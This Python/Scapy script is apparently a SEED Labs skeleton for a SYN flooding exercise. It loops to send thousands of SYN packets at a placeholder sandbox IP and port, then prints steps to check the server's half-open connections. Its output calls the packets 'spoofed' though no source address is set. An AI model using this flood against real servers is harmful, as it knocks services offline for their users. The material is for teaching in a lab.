#!/usr/bin/env python3
"""
SYN Flooding Attack - Scapy skeleton (SEED Labs Task 1, adapted).
Fill in every @@@@ yourself - the values are specific to THIS sandbox,
not the ones in the PDF handout.
"""
from scapy.all import IP, TCP, RandShort, send

DST_IP   = "@@@@"   # the server's IP address you found with nmap
DST_PORT = "@@@@"   # the telnet port you found with nmap (NOT 23)
COUNT    = 2000     # increase if the backlog doesn't fill fast enough

for i in range(COUNT):
    pkt = IP(dst=DST_IP) / TCP(sport=RandShort(), dport=DST_PORT, flags="S")
    send(pkt, verbose=0)

print(f"Sent {COUNT} spoofed SYN packets to {DST_IP}:{DST_PORT}")
print("Now check (via SSH): ss -tn state syn-recv | wc -l  on the server,")
print("and try opening a brand new telnet connection from a third terminal.")
